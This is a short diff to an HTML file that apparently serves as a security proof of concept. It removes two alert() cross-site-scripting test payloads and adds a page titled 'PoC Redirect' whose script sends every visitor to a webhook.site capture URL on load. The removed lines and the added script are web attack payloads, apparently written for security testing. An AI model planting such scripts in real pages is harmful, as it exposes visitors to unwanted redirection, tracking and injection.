@@ -1,5 +1,11 @@
-<!-- xss.html -->
+<!DOCTYPE html>
 <html>
-  <head><title><script>alert('Title XSS')</script></title></head>
-  <body><script>alert("Body XSS")</script></body>
+  <head><title>PoC Redirect</title></head>
+  <body>
+    <h2>Redirecting...</h2>
+    <script>
+      window.location = "https://webhook.site/78550bb3-272e-4804-b068-2a77b48cf307";
+    </script>
+  </body>
 </html>
+
